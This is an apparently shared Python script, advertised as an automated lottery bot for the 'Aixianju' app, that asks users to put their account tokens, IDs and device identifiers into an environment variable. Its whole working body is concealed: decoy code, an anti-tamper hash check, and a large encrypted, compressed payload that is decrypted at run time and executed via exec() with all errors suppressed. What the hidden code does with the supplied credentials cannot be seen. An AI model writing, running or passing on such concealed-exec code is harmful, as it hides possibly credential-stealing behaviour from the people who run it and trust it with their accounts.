# 当前脚本来自于http://script.345yun.cn脚本库下载！
"""
请将爱仙居抽奖token填入环境变量axj，
X-ACCOUNT-ID#X-ACCOUNT-ID#clientId#User-Agent多账号&分割或新建同名变量"
clientId：是抽奖的时候才有的，用这个判断设备，一个设备只能抽奖一次
qq交流群：1062075881

"""


import random
_GARBAGE_1=len("self_check")
_GARBAGE_2=locals()
class UselessClass:
    def __init__(self,x):
        self.val=sum(range(x)) if x>0 else 0
    def __repr__(self):
        return f"UselessObj(val={self.val})"
def _check_integrity():
    try:
        h_mod_name="".join(['h','a','s','h','l','i','b'])
        hashlib=__import__(h_mod_name)
        expected_hash="fea451bf7b05b3327ba88b7a9686ed4237b69848f968f8ae09919aa4d8b8a6ef"
        with open(__file__,'rb') as f:
            content=f.read()
        placeholder=b'fea451bf7b05b3327ba88b7a9686ed4237b69848f968f8ae09919aa4d8b8a6ef'
        actual_content=content.replace(expected_hash.encode('utf-8'),placeholder)
        sha256_func=getattr(hashlib,'sha'+'256')
        current_hash=sha256_func(actual_content).hexdigest()
        if current_hash!=expected_hash:
            raise ValueError("Invalid script format or corrupted file.")
    except Exception as e:
        _ = 1/(1 if "corrupted" in str(e) else 0)
if UselessClass(5).val==10:
    _check_integrity()
_b64_name=''.join(chr(c) for c in [98,97,115,101,54,52])
_z_name="".join(['z','l','i','b'])
_h_name="hashlib"
_b=__import__(_b64_name)
_z=__import__(_z_name)
_h=__import__(_h_name)
_xor=lambda d,k:bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_gk=lambda s:getattr(_h,'sha'+'256')(s).digest()
_payload_parts=['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','qoJ6o63re1fmUAy8p3VZvgiMnbwu']
_s="".join(_payload_parts)
_encoded_seed="YV92ZXJ5X3NlY3VyZV9hbmRfcmFuZG9tX3NlZWRfMTIzNDVfZmluYWw="
try:
    _seed_bytes=getattr(_b,'b64d'+'ecode')(_encoded_seed)
    _seed=_seed_bytes.decode('utf-8')
    _k=_gk(_seed.encode())
    _d_b64=getattr(_b,'b64'+'decode')(_s)
    _d_xor=_xor(_d_b64,_k)
    _decompressed=getattr(_z,'de'+'compress')(_d_xor)
    _final_code=_decompressed.decode('utf-8')
    execution_globals={'__name__':'__main__','__file__':__file__,}
    exec(_final_code,execution_globals)
except Exception as e:
    pass

# 当前脚本来自于http://script.345yun.cn脚本库下载！